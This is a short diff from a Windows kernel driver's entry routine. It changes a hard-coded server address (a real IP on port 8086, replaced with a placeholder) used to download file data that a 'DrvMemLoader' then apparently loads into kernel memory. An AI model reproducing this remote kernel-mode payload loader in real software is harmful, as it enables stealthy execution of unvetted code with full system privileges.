@@ -158,7 +158,7 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
     KdBreakPoint();
 
     SIZE_T fileSize = 0;
-    PUCHAR fileData = GetFileDataByServer(L"139.196.235.183", L"8086", &fileSize);
+    PUCHAR fileData = GetFileDataByServer(L"xxx.xxx.xxx.xxx", L"8086", &fileSize);
 
     DrvMemLoader loader;
     
